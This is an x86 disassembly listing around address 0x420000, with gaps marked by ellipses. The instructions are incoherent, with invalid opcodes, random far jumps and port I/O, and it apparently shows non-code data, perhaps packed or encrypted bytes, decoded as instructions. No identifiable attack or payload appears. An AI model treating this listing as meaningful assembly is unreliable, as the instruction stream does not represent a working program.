  420016:	bound  esp,QWORD PTR [ebp-0x8808a]
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0xe
  420023:	or     eax,DWORD PTR [edi]
  420025:	jge    0x42009b
  420027:	push   ebx
  420028:	add    DWORD PTR [eax],eax
  42002a:	pop    es
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    BYTE PTR [ecx],cl
  42002f:	mov    cl,0x6b
  420031:	mov    ebp,0x91ef574a
  420037:	das    
  420038:	mov    al,BYTE PTR [ebx+ebp*8-0xcc0f3d8]
  42003f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420040:	pop    eax
  420041:	fldcw  WORD PTR [edi+0x58f28c7b]
  420047:	push   ebx
  420048:	sub    edx,DWORD PTR [esi]
  42004a:	repnz xchg ebx,eax
  42004c:	test   al,0x60
  42004e:	xchg   esi,eax
  42004f:	mov    ch,0x61
  420051:	jno    0x420042
  420053:	and    al,0x8e
  420055:	inc    ebp
  420056:	mov    ecx,0xffd4367b
  42005b:	xchg   BYTE PTR [ecx],bh
  42005d:	inc    ebp
  42005e:	dec    eax
  42005f:	in     al,dx
  420060:	stos   DWORD PTR es:[edi],eax
  420061:	lds    eax,FWORD PTR [edx]
  420063:	jne    0x420063
  420065:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420066:	jb     0x420009
  420068:	daa    
  420069:	mov    ebx,0x9937e385
  42006e:	sahf   
  42006f:	test   eax,0x49c0007e
  420074:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420075:	in     eax,dx
  420076:	repz ret 0x21d4
  42007a:	ret    0xc8ec
  42007d:	mov    bh,0xa6
  420080:	and    eax,DWORD PTR [esp+ebx*1]
  420083:	jle    0x420033
  420085:	mov    esp,DWORD PTR [edi+ebx*2+0x2affd594]
  42008c:	shl    DWORD PTR [ebx],cl
  42008e:	add    BYTE PTR [esi-0x71],ch
  420091:	call   0xc734:0xc73cedea
  420098:	push   eax
  420099:	stos   BYTE PTR es:[edi],al
  42009a:	in     eax,dx
  42009b:	jae    0x42003d
  42009d:	pop    esi
  42009e:	dec    BYTE PTR [edx]
  4200a0:	cmp    eax,0x167f0d2e
  4200a5:	add    cl,BYTE PTR [ebx+0x2a]
  4200a8:	jo     0x420090
  4200aa:	xor    eax,0x79d54838
  4200af:	mov    ch,0xe8
  4200b1:	stos   BYTE PTR es:[edi],al
  4200b2:	pop    edx
  4200b3:	aas    
  4200b4:	xor    DWORD PTR [ebp-0x3dc56a0c],esi
  4200ba:	call   0xd8a3:0x21666104
  4200c1:	std    
  4200c2:	xchg   edi,eax
  4200c3:	pop    dx
  4200c5:	call   0x3f29965c
  4200ca:	loopne 0x4200f5
  4200cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200cd:	in     al,0x65
  4200cf:	inc    esi
  4200d0:	leave  
  4200d1:	sub    DWORD PTR [ecx],0xfffffff3
  4200d4:	fs ja  0x42011a
  4200d7:	adc    esi,DWORD PTR [esi]
  4200d9:	xor    al,0x3e
  4200db:	or     al,0x57
  4200dd:	pop    ebp
  4200de:	push   es
  4200df:	vmovntdq XMMWORD PTR [edx+0x52],xmm0
  4200e4:	jp     0x42012b
  4200e6:	(bad)  
  4200e7:	outs   dx,DWORD PTR ds:[esi]
  4200e8:	pop    ss
  4200e9:	adc    ch,BYTE PTR [edx-0x37]
  4200ec:	in     al,dx
  4200ed:	sbb    eax,0xace14b72
  4200f2:	rcr    DWORD PTR [edx+esi*1],cl
  4200f5:	adc    eax,0xd4acb9bd
  4200fa:	fidiv  DWORD PTR [ebp-0xd0e4620]
  420100:	jno    0x4200aa
  420102:	nop
  420103:	jo     0x4200b3
  420105:	dec    eax
  420106:	dec    esp
  420108:	pop    ds
  420109:	stc    
  42010a:	retf   
  42010b:	pop    ss
  42010c:	sub    eax,0xf5a3ce7d
  420111:	sub    ebp,0xffffffc8
  420114:	push   0xffffffeb
  420116:	jp     0x420099
  420118:	ins    BYTE PTR es:[edi],dx
  420119:	push   esi
  42011a:	mov    eax,ds:0xbf1b450
  42011f:	push   eax
  420120:	push   edi
  420121:	pop    ecx
  420122:	stc    
  420123:	adc    edx,ebp
  420125:	xlat   BYTE PTR ds:[ebx]
  420126:	push   eax
  420127:	mov    ds:0xf7b5c9e8,al
  42012c:	imul   ebp,DWORD PTR [ebx-0x2c],0x1b20e75d
  420133:	push   0x2f
	...
  420195:	add    BYTE PTR [ebx-0x31],dh
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	icebp  
  4201a3:	xor    dl,BYTE PTR [esi+0x41]
  4201a6:	jnp    0x4201fc
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    BYTE PTR [ebp+0x737f1f60],bl
  4201b3:	retf   
  4201b4:	loop   0x42020c
  4201b6:	ss data16 aam 0x89
  4201ba:	fist   WORD PTR [ebx+edi*2+0x49c39c67]
  4201c1:	call   0x1ba8:0x32108a5b
  4201c8:	dec    ebp
  4201c9:	aaa    
  4201ca:	in     al,dx
  4201cb:	cli    
  4201cc:	daa    
  4201cd:	jb     0x4201d3
  4201cf:	push   edi
  4201d0:	jmp    0x420250
  4201d2:	lods   eax,DWORD PTR ds:[esi]
  4201d3:	rcr    bl,0xe
  4201d6:	mov    edi,0xc459920
  4201db:	sbb    BYTE PTR [edi+0x5f],bh
  4201de:	inc    edx
  4201df:	out    0x16,al
  4201e1:	sbb    edi,DWORD PTR [edi+0x66ed1b56]
  4201e7:	pop    ecx
  4201e8:	jmp    0x388a84d6
  4201ed:	int    0x3e
  4201ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4201f0:	adc    edi,ebx
  4201f2:	or     eax,0xa772dbe5
  4201f7:	and    DWORD PTR ds:0xc403937,edx
  4201fd:	adc    cl,BYTE PTR [edx-0x5f]
  420200:	aaa    
  420201:	(bad)  
  420202:	jo     0x4201ed
  420204:	cmp    eax,0x990b30dc
  420209:	xchg   edx,eax
  42020a:	sbb    al,0x6a
  42020c:	leave  
  42020d:	aas    
  42020e:	xor    DWORD PTR [edx-0x1e3036dd],0xffffffb3
  420215:	daa    
  420216:	mov    edx,DWORD PTR [ebx]
  420218:	dec    esp
  420219:	cld    
  42021a:	xchg   ebp,eax
  42021b:	mov    edx,0x4ad7668f
  420220:	xchg   BYTE PTR [ecx],bl
  420222:	xor    al,0xf7
  420224:	call   0x56ae8ae1
  420229:	add    ebx,esi
  42022b:	dec    ebx
  42022c:	mov    edi,0x9e97b408
  420231:	dec    edi
  420232:	add    BYTE PTR [eax-0x4bc2b722],0x6d
  420239:	addr16 push ebx
  42023b:	stos   BYTE PTR es:[edi],al
  42023c:	(bad)  
  42023d:	stos   DWORD PTR es:[edi],eax
  42023e:	shl    DWORD PTR [eax+0x32e64134],cl
  420244:	mov    al,ds:0x79961ed3
  420249:	fdiv   st(4),st
  42024b:	push   ss
  42024c:	xor    edx,DWORD PTR [esp+edi*4-0x6d]
  420250:	loopne 0x420225
  420252:	sti    
  420253:	mov    edi,0x7c282c50
  420258:	mov    ah,0xed
  42025a:	jge    0x420257
  42025c:	pusha  
  42025d:	xchg   ebx,eax
  42025e:	add    ch,BYTE PTR [edi-0x6e576167]
  420264:	push   cs
  420265:	rcr    BYTE PTR [ebx],cl
  420267:	add    al,0x24
  420269:	fwait
  42026a:	ret    0x32cf
  42026d:	addr16 addr16 pop ds
  420270:	iret   
  420271:	aam    0xf8
  420273:	add    edi,esp
  420275:	sub    esp,DWORD PTR [esi+0x20afd4fa]
  42027b:	cmp    edx,DWORD PTR [eax-0x47]
  42027e:	xor    DWORD PTR [edx+edx*4-0x4886c3cc],edx
  420285:	xchg   ebx,eax
  420286:	stos   DWORD PTR es:[edi],eax
  420287:	in     al,dx
  420288:	iret   
  420289:	cmp    al,0x9a
  42028b:	cld    
  42028c:	push   ebp
  42028d:	outs   dx,DWORD PTR ds:[esi]
  42028e:	pop    ss
  42028f:	jae    0x420280
  420291:	and    eax,0x8dea1cd9
  420296:	add    BYTE PTR [edi],ch
  420298:	adc    DWORD PTR [edi+0x1f],esi
  42029b:	xchg   esp,eax
  42029c:	xor    eax,0xaa68d66c
  4202a1:	(bad)  
  4202a2:	mov    ds:0x77697b8,eax
  4202a7:	add    eax,0x2efe4a26
  4202ac:	enter  0x28d1,0x9d
  4202b0:	jne    0x4202fc
  4202b2:	leave  
  4202b3:	jmp    0x0:0x57
	...
  420316:	inc    ecx
  420317:	push   es
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fbld   TBYTE PTR [edi+0x32]
  420324:	dec    eax
  420325:	rol    BYTE PTR [edx+0x7000155],0x1
  42032c:	add    BYTE PTR [eax],al
  42032e:	lds    ebx,FWORD PTR [esp+ebx*8]
  420331:	test   DWORD PTR [ebp+0x6b],0x13711897
  420338:	jge    0x4202c6
  42033a:	sbb    eax,0x1d2da698
  42033f:	dec    ecx
  420340:	jne    0x420303
  420342:	adc    al,0x5e
  420344:	cmp    bl,0x87
  420347:	xchg   edx,eax
  420348:	clc    
  420349:	dec    ebx
  42034a:	xor    DWORD PTR [edx+0x626bf4ad],ebx
  420350:	hlt    
  420351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420352:	ins    BYTE PTR es:[edi],dx
  420353:	inc    esi
  420354:	jnp    0x4203cc
  420356:	fcom   QWORD PTR [esi+0x35d845ed]
  42035c:	repz in al,0xd6
  42035f:	in     eax,0xff
  420361:	loop   0x4203c0
  420363:	inc    esp
  420364:	mov    eax,ds:0xa0eb94d6
  420369:	xor    eax,0x20d988d1
  42036e:	leave  
  42036f:	sbb    eax,0xc3f7b6fe
  420374:	dec    esp
  420375:	cmp    ebp,DWORD PTR [edx]
  420377:	(bad)  
  420378:	sbb    ebp,0xffffffc4
  42037b:	jmp    0x420389
  42037d:	mov    eax,ds:0xbb59f6bb
  420382:	push   esi
  420383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420384:	(bad)  
  420385:	int3   
  420386:	sub    al,0x4f
  420388:	sti    
  420389:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42038b:	jl     0x42035d
  42038d:	bound  esi,QWORD PTR [edx+ebx*1-0x33]
  420391:	dec    ebp
  420392:	enter  0x71ff,0xcc
  420396:	lahf   
  420397:	adc    edx,DWORD PTR fs:[ecx+0x20695679]
  42039e:	dec    esp
  42039f:	icebp  
  4203a0:	js     0x4203bf
  4203a2:	cmc    
  4203a3:	mov    eax,ds:0x5ad6dd0f
  4203a8:	fstp   QWORD PTR [ebp+esi*8-0x64]
  4203ac:	adc    BYTE PTR [eax],cl
  4203ae:	jle    0x4203dd
  4203b0:	out    0xab,eax
  4203b2:	jno    0x4203a3
  4203b4:	sbb    edi,DWORD PTR [ebx*8+0x3d03cb04]
  4203bb:	int    0xad
  4203bd:	mov    ds:0x52839831,eax
  4203c2:	push   esp
  4203c3:	sbb    al,0x89
  4203c5:	xchg   edi,eax
  4203c6:	out    0xe2,eax
  4203c8:	cmp    cl,BYTE PTR [ecx]
  4203ca:	arpl   cx,bp
  4203cc:	aad    0x9b
  4203ce:	xchg   ebx,eax
  4203cf:	inc    edi
  4203d0:	int3   
  4203d1:	add    eax,0x276c3aae
  4203d6:	std    
  4203d7:	sub    BYTE PTR [ebp+0x5b3a3db2],0x1e
  4203de:	je     0x420428
  4203e0:	lahf   
  4203e1:	lea    ebp,[ebx+0x4]
  4203e4:	js     0x420381
  4203e6:	and    al,0x53
  4203e8:	test   al,0xb6
  4203ea:	inc    esi
  4203eb:	mov    dh,0x5a
  4203ed:	dec    eax
  4203ee:	int3   
  4203ef:	imul   ecx,eax,0x485fadb9
  4203f5:	test   eax,0xf88c53ab
  4203fa:	xor    al,0x74
  4203fc:	sbb    al,0x98
  4203fe:	icebp  
  4203ff:	pop    ss
  420400:	jne    0x4203ef
  420402:	mov    bl,0x52
  420404:	add    DWORD PTR [eax-0x47188e8c],0x7f
  42040b:	addr16 mov ebx,0xe05221ce
  420411:	jne    0x420476
  420413:	xor    BYTE PTR [ebx],ah
  420415:	xor    al,0xc6
  420417:	push   ebp
  420418:	cmp    esi,ebp
  42041a:	push   ds
  42041b:	mov    edx,0x6f34d07
  420420:	push   ss
  420421:	inc    ebp
  420422:	mov    bh,0x8a
  420424:	ret    
  420425:	out    dx,eax
  420426:	push   cs
  420427:	retf   0xbe9
  42042a:	int    0x5f
  42042c:	inc    ebx
  42042d:	es mov cl,0x18
  420430:	(bad)  
  420431:	push   ds
  420432:	xchg   esp,eax
  420433:	inc    ebp
  420434:	or     al,BYTE PTR [eax]
	...
  420496:	scas   al,BYTE PTR es:[edi]
  420497:	xchg   esp,eax
  420498:	push   edi
  420499:	adc    bh,BYTE PTR [edi-0x2d]
  42049c:	out    dx,eax
  42049d:	mov    esp,0xb41496f0
  4204a2:	adc    al,0x4c
  4204a4:	sbb    BYTE PTR [edi],0x89
  4204a7:	push   esi
  4204a8:	add    DWORD PTR [eax],eax
  4204aa:	pop    es
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    BYTE PTR [eax+ebp*8],cl
  4204b0:	fsub   DWORD PTR [eax+eiz*8]
  4204b3:	mov    cl,0xb1
  4204b5:	leave  
  4204b6:	cmp    ah,BYTE PTR [edi-0x31]
  4204b9:	aaa    
  4204ba:	jo     0x4204bf
  4204bc:	xchg   BYTE PTR [eax-0x6],cl
  4204bf:	and    edx,DWORD PTR [ecx+eax*4-0x1184ae61]
  4204c6:	dec    edx
  4204c7:	aad    0xf5
  4204c9:	push   ss
  4204ca:	data16 fild DWORD PTR [esi+ecx*2-0x10]
  4204cf:	push   ss
  4204d0:	imul   ecx,DWORD PTR [edi],0x390f2ba1
  4204d6:	out    0xbd,al
  4204d8:	push   0x4eb55c61
  4204dd:	and    BYTE PTR [ecx+0x20],dh
  4204e0:	leave  
  4204e1:	in     eax,dx
  4204e2:	rcl    BYTE PTR [edi],cl
  4204e4:	fwait
  4204e5:	sbb    edi,DWORD PTR ds:0x9120d8ed
  4204eb:	and    ch,bh
  4204ed:	js     0x420540
  4204ef:	push   ecx
  4204f0:	or     al,0xa8
  4204f2:	sbb    eax,0x66e2090d
  4204f7:	aas    
  4204f8:	push   0x68af2efe
  4204fd:	jb     0x4204e7
  4204ff:	mul    BYTE PTR ss:[ebx-0x29fafba0]
  420506:	jle    0x42048b
  420508:	ins    DWORD PTR es:[edi],dx
  420509:	mov    ecx,0x7c408d3e
  42050e:	jg     0x420510
  420510:	pop    ecx
  420511:	sub    ch,bl
  420513:	mov    ds:0x11a613a,eax
  420518:	push   ds
  420519:	test   BYTE PTR [edi],dl
  42051b:	xchg   esi,eax
  42051c:	ja     0x4204bb
  42051e:	mov    ss,WORD PTR [ebp+ebx*4+0x4a]
  420522:	into   
  420523:	fidiv  DWORD PTR [ebp-0x5fde6c01]
  420529:	and    bl,BYTE PTR [ebx+0x457c719]
  42052f:	sub    al,0x69
  420531:	fs mov esp,0x91557421
  420537:	push   esi
  420538:	mov    esp,0x646d52d8
  42053d:	inc    edi
  42053e:	inc    ebx
  42053f:	ret    
  420540:	ss cdq 
  420542:	xchg   esp,eax
  420543:	lods   eax,DWORD PTR ds:[esi]
  420544:	je     0x4205b2
  420546:	dec    edx
  420547:	adc    ebx,esp
  420549:	(bad)  
  42054a:	xchg   ebx,eax
  42054b:	lods   eax,DWORD PTR ds:[esi]
  42054c:	fdivr  QWORD PTR [esi-0x4d]
  42054f:	into   
  420550:	std    
  420551:	jno    0x420523
  420553:	mov    ebp,?
  420555:	aas    
  420556:	xchg   ebp,eax
  420557:	in     eax,0xce
  420559:	hlt    
  42055a:	add    BYTE PTR [ebp+0x40],ch
  42055d:	xchg   edx,eax
  42055e:	adc    DWORD PTR [eax-0x44],0x85fbf582
  420565:	(bad)  
  420566:	push   edx
  420567:	ja     0x4205b5
  420569:	push   0x42dcccac
  42056e:	mov    WORD PTR [ebx+0x2821b48],?
  420574:	ret    0xe486
  420577:	xor    eax,0x7e
  42057a:	ret    
  42057b:	sahf   
  42057c:	loop   0x420596
  42057e:	sbb    dh,BYTE PTR [ecx+0x38]
  420581:	mov    esi,0xc17b1931
  420586:	push   0xf2fbefe1
  42058b:	mov    al,0x13
  42058d:	cmp    dl,BYTE PTR [edx+0x4e2b9567]
  420593:	push   0xffffffba
  420595:	dec    edx
  420596:	(bad)  
  420597:	mov    esi,DWORD PTR [eax-0x6ca6d092]
  42059d:	in     eax,0x3b
  42059f:	dec    edx
  4205a0:	mov    dl,0x61
  4205a2:	adc    bh,dh
  4205a4:	jmp    0x45051e4d
  4205a9:	or     ecx,DWORD PTR [edi+0x41]
  4205ac:	aas    
  4205ad:	sbb    DWORD PTR [ecx-0x354b2493],ebp
  4205b3:	xor    al,0x3e
	...
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0x13e96161
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    BYTE PTR [eax+0x68bcaae8],ch
  420633:	add    edx,0x54471001
  420639:	and    eax,0x3dfd2814
  42063e:	push   ss
  42063f:	es bnd jno 0x420664
  420643:	pop    eax
  420644:	in     eax,dx
  420645:	loope  0x4205dc
  420647:	dec    ecx
  420648:	add    al,0xb
  42064a:	dec    esi
  42064b:	out    dx,eax
  42064c:	aas    
  42064d:	shl    BYTE PTR [edi+0x16],1
  420650:	adc    al,0xac
  420652:	xchg   ecx,eax
  420653:	les    edi,FWORD PTR [esi+ebx*8+0x71]
  420657:	inc    esi
  420658:	fsubr  DWORD PTR [ebx]
  42065a:	gs mov edx,0x77b4559d
  420660:	in     eax,0xed
  420662:	int3   
  420663:	mov    al,0xf7
  420665:	inc    eax
  420666:	ja     0x420684
  420668:	mov    al,0x43
  42066a:	loop   0x420627
  42066c:	loope  0x420635
  42066e:	lods   eax,DWORD PTR ds:[esi]
  42066f:	hlt    
  420670:	test   eax,0xea3159ae
  420675:	cmp    al,0xa9
  420677:	sub    bh,BYTE PTR [ecx-0x39]
  42067a:	mov    bh,0x7b
  42067c:	out    0x5a,al
  42067e:	sar    DWORD PTR gs:[ebp+0x63a64a3c],cl
  420685:	scas   eax,DWORD PTR es:[edi]
  420686:	mov    BYTE PTR [ebx-0x21],ch
  420689:	sti    
  42068a:	dec    esp
  42068b:	(bad)  
  42068c:	fsub   QWORD PTR [edi+edi*2+0x73eb6607]
  420693:	call   0xb0fcaa0
  420698:	cli    
  420699:	push   cs
  42069a:	xchg   ebp,eax
  42069b:	push   ebp
  42069c:	arpl   WORD PTR [esi+0x25b5d954],di
  4206a2:	push   cs
  4206a3:	and    cl,BYTE PTR [ecx]
  4206a5:	push   cs
  4206a6:	inc    eax
  4206a7:	push   edx
  4206a8:	add    ebx,DWORD PTR [esi-0x73]
  4206ab:	(bad)  
  4206ac:	fistp  WORD PTR [eax]
  4206ae:	xor    BYTE PTR [ebx-0x4023af1],cl
  4206b4:	call   0x7e98:0x21adf511
  4206bb:	or     BYTE PTR ds:0xe3b8f71,ch
  4206c1:	bound  ecx,QWORD PTR [ebx+0x688dc6b2]
  4206c7:	sub    eax,0x23c167fc
  4206cc:	mov    es,WORD PTR [ebp+0x3]
  4206cf:	adc    eax,DWORD PTR cs:0xd6b701a8
  4206d6:	pop    ebp
  4206d7:	icebp  
  4206d8:	ss push ebx
  4206da:	(bad)  
  4206db:	sti    
  4206dc:	pushf  
  4206dd:	jg     0x420705
  4206df:	outs   dx,DWORD PTR ds:[esi]
  4206e0:	add    esi,DWORD PTR [ecx-0x7de6f23a]
  4206e6:	int3   
  4206e7:	mov    dl,0xb3
  4206e9:	stos   DWORD PTR es:[edi],eax
  4206ea:	mov    bl,0xb8
  4206ec:	dec    eax
  4206ed:	shl    BYTE PTR ds:0x5ff6e91a,1
  4206f3:	hlt    
  4206f4:	imul   ebp,DWORD PTR [esi+0x50b7f86b],0xffffffb7
  4206fb:	sub    eax,0xe7ddbabd
  420700:	inc    esi
  420701:	jmp    0x1a2f:0x5dd4496f
  420708:	mov    bh,0x54
  42070a:	pop    esp
  42070b:	or     BYTE PTR [ebp-0x7c],0x8d
  42070f:	js     0x420773
  420711:	mov    ah,0x15
  420713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420714:	and    ah,dl
  420716:	icebp  
  420717:	push   ebp
  420718:	daa    
  420719:	out    0x92,al
  42071b:	test   al,0xf5
  42071d:	(bad)  
  42071e:	scas   eax,DWORD PTR es:[edi]
  42071f:	or     al,0x13
  420721:	mov    dh,0xe6
  420723:	sbb    eax,0x85036ac3
  420728:	sub    ebx,DWORD PTR [eax+0x4e5d89ac]
  42072e:	and    BYTE PTR [eax+0x3e],al
  420731:	ret    0xf830
  420734:	dec    ebp
	...
  420795:	add    BYTE PTR [ecx-0x587fdad1],cl
  42079b:	mov    ch,BYTE PTR [ebp-0x642816d1]
  4207a1:	sub    esp,DWORD PTR [esi]
  4207a3:	not    DWORD PTR [si]
  4207a6:	xchg   edi,eax
  4207a7:	pop    eax
  4207a8:	add    DWORD PTR [eax],eax
  4207aa:	pop    es
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    BYTE PTR [esi],al
  4207af:	(bad)  
  4207b0:	inc    esp
  4207b1:	sbb    eax,0xb53242f0
  4207b6:	retf   
  4207b7:	jno    0x420805
  4207b9:	(bad)  
  4207ba:	fbld   TBYTE PTR [eax]
  4207bc:	sub    eax,0x4914dca2
  4207c1:	in     al,0xba
  4207c3:	cwde   
  4207c4:	mov    BYTE PTR [eax-0x49acaed8],cl
  4207ca:	in     eax,dx
  4207cb:	mov    dh,0xf0
  4207cd:	call   0x9a34c5c2
  4207d2:	pop    edi
  4207d3:	sti    
  4207d4:	or     eax,0x6a3f7c90
  4207d9:	xchg   edi,eax
  4207da:	hlt    
  4207db:	or     DWORD PTR [ebx],edi
  4207dd:	pop    eax
  4207de:	rcl    DWORD PTR [ecx],cl
  4207e0:	xchg   ecx,eax
  4207e1:	pop    ebx
  4207e2:	jmp    0xe42a:0xedd9a665
  4207e9:	cmp    cl,dh
  4207eb:	je     0x4207ae
  4207ed:	or     DWORD PTR [eax],0xb736eeb5
  4207f3:	ds push cs
  4207f5:	adc    esp,ebx
  4207f7:	stos   BYTE PTR es:[edi],al
  4207f8:	push   ds
  4207f9:	nop
  4207fa:	sub    bh,cl
  4207fc:	les    esp,FWORD PTR [edx+0x4859a94f]
  420802:	and    BYTE PTR [eax+0x48],bl
  420805:	psubsw mm6,QWORD PTR [edi]
  420808:	add    al,0x3
  42080a:	je     0x4207e6
  42080c:	mov    BYTE PTR cs:[ecx-0x1a],dl
  420810:	pop    edx
  420811:	jbe    0x420830
  420813:	fdivr  QWORD PTR [ebx+0x67b93501]
  420819:	sbb    BYTE PTR [esi+eiz*1-0x766f468a],ah
  420820:	xchg   edi,eax
  420821:	enter  0xa641,0x50
  420825:	jb     0x420865
  420827:	shr    DWORD PTR [ebx],1
  420829:	pop    esi
  42082a:	mov    ebp,0x65809cdf
  42082f:	sbb    cl,0xc4
  420832:	cmc    
  420833:	in     al,0xeb
  420835:	push   esp
  420836:	adc    eax,0x5e2be999
  42083b:	xor    DWORD PTR [ebp+0x1cef7341],eax
  420841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420842:	push   edx
  420844:	push   0xffffffa9
  420846:	and    al,0xf
  420848:	mov    ah,0x15
  42084a:	pushf  
  42084b:	mov    bl,0xc3
  42084d:	xor    eax,0x98465b8d
  420852:	in     al,dx
  420853:	cli    
  420854:	jb     0x4207da
  420856:	jp     0x42087d
  420858:	pop    ebx
  420859:	mov    bl,0xaf
  42085b:	addr16 arpl dx,bx
  42085e:	dec    edx
  42085f:	out    0x2d,al
  420861:	adc    bl,BYTE PTR [esi+0x7673230a]
  420867:	inc    esp
  420868:	adc    edi,ebx
  42086a:	push   ss
  42086b:	adc    DWORD PTR ds:0xd78b1303,0xffffffd3
  420872:	sahf   
  420873:	mov    eax,es
  420875:	test   DWORD PTR [eax+edi*8+0x19],ebx
  420879:	sti    
  42087a:	and    al,0x17
  42087c:	sar    bh,0x3f
  42087f:	test   al,ch
  420881:	add    eax,0x2c9b708e
  420886:	sub    edx,0x75
  420889:	jge    0x420891
  42088b:	or     al,0x15
  42088d:	inc    ebp
  42088e:	sub    ebp,DWORD PTR [esi-0x22]
  420891:	shr    bh,0x49
  420894:	cmc    
  420895:	fisub  DWORD PTR [edx-0x73]
  420898:	mov    DWORD PTR [edi+0x4f],edx
  42089b:	mov    al,0xfc
  42089d:	scas   al,BYTE PTR es:[edi]
  42089e:	(bad)  
  42089f:	xchg   ebp,eax
  4208a0:	mov    edx,0x8d76b1df
  4208a5:	ret    0xed60
  4208a8:	es adc ah,dh
  4208ab:	mov    ah,0x83
  4208ad:	push   eax
  4208ae:	test   DWORD PTR [ebp+edi*4-0x1f],ebx
  4208b2:	add    al,BYTE PTR [ecx+0xf6]
	...
  420914:	add    BYTE PTR [eax],al
  420916:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0xb1ae
  420924:	hlt    
  420925:	and    ebx,DWORD PTR [esi+0x7000159]
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    BYTE PTR ds:0x4f843f79,bh
  420933:	xchg   ebx,eax
  420934:	into   
  420935:	pop    ebp
  420936:	add    BYTE PTR [edi-0x74866ea0],0xa7
  42093d:	sar    DWORD PTR [esi-0x794449be],0x72
  420944:	cmp    esp,edi
  420946:	xor    al,0xe1
  420948:	mov    edi,0x519ed39c
  42094d:	inc    ebx
  42094e:	cmp    BYTE PTR [esi-0x78922d6],ah
  420954:	and    BYTE PTR [ebx+0x4230f9b3],ch
  42095a:	mov    ch,0xe0
  42095c:	mov    es,WORD PTR [edi-0xf]
  42095f:	(bad)  
  420960:	mov    DWORD PTR [eax-0x76],ebx
  420963:	cmp    bl,BYTE PTR [esi-0x39]
  420966:	inc    esi
  420967:	sub    ah,BYTE PTR [edi+0x7a]
  42096a:	hlt    
  42096b:	and    cl,BYTE PTR [ebp+0x3e]
  42096e:	rcl    BYTE PTR [eax],1
  420970:	mov    ch,BYTE PTR [edx+0x30]
  420973:	out    dx,eax
  420974:	aaa    
  420975:	push   cs
  420976:	push   edx
  420977:	dec    edi
  420978:	ffree  st(7)
  42097a:	dec    edi
  42097b:	(bad)  
  42097c:	out    0x58,eax
  42097e:	popa   
  42097f:	add    bh,BYTE PTR [edx-0x754e00da]
  420985:	nop
  420986:	xchg   DWORD PTR [ebp+eiz*4+0x20a9bbbd],esi
  42098d:	mov    edx,0x6717de0d
  420992:	loope  0x420995
  420994:	aas    
  420995:	sub    DWORD PTR [edi],esi
  420997:	retf   
  420998:	xlat   BYTE PTR ds:[ebx]
  420999:	shr    BYTE PTR [ebp-0x23],0x41
  42099d:	sub    al,cl
  42099f:	sbb    al,0xf4
  4209a1:	pop    ebx
  4209a2:	(bad)  
  4209a3:	bound  edx,QWORD PTR [edx]
  4209a5:	test   al,0xff
  4209a7:	test   al,0xad
  4209a9:	sbb    BYTE PTR [eax+0x6f45f699],al
  4209af:	jbe    0x4209a1
  4209b1:	dec    esp
  4209b2:	dec    ebp
  4209b3:	stc    
  4209b4:	les    ebx,FWORD PTR ds:[edi+0x525e248e]
  4209bb:	cld    
  4209bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209bd:	jmp    0xc8b1:0x6842751e
  4209c4:	and    edx,DWORD PTR [esi+0x28]
  4209c7:	js     0x42095d
  4209c9:	mov    bl,BYTE PTR [ebx-0x44f18c17]
  4209cf:	mov    eax,0x9aff3a8d
  4209d4:	inc    esi
  4209d5:	mov    DWORD PTR [esi],edx
  4209d7:	xor    ebx,0x28
  4209da:	xchg   edi,eax
  4209db:	and    eax,0x99d2827f
  4209e0:	in     al,dx
  4209e1:	ret    0xf719
  4209e4:	lds    ecx,FWORD PTR [ebx-0x17]
  4209e7:	mov    ebp,DWORD PTR [ecx-0x33]
  4209ea:	out    dx,eax
  4209eb:	mov    ebx,0xf2be3c50
  4209f0:	fcom   QWORD PTR [eax]
  4209f2:	push   es
  4209f3:	mov    ecx,0x49b484fd
  4209f8:	aam    0x69
  4209fa:	retf   0xee4f
  4209fd:	dec    DWORD PTR [edx]
  4209ff:	pop    esi
  420a00:	imul   esp,DWORD PTR [ebx+0x441610a],0xffffffc0
  420a07:	jb     0x42098e
  420a09:	inc    ebx
  420a0a:	mov    al,ds:0x9f278bce
  420a0f:	jno    0x4209b5
  420a11:	push   ebp
  420a12:	sbb    BYTE PTR [esi+0x2b],bh
  420a15:	jmp    0x4d96:0xb4c1e24a
  420a1c:	std    
  420a1d:	xor    al,0x6e
  420a1f:	cmp    BYTE PTR [eax+0x36],cl
  420a22:	jae    0x4209c5
  420a24:	sbb    dl,0x2
  420a27:	not    BYTE PTR [eax-0x761ca6f4]
  420a2d:	cmp    esp,DWORD PTR [esp+ecx*4]
  420a30:	push   es
  420a31:	stc    
  420a32:	int    0x6
  420a34:	dec    eax
	...
  420a95:	add    bh,bl
  420a97:	xor    ch,BYTE PTR [edi-0x6010ed]
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   BYTE PTR [ebx-0x5ad63c48],cl
  420aa7:	pop    edx
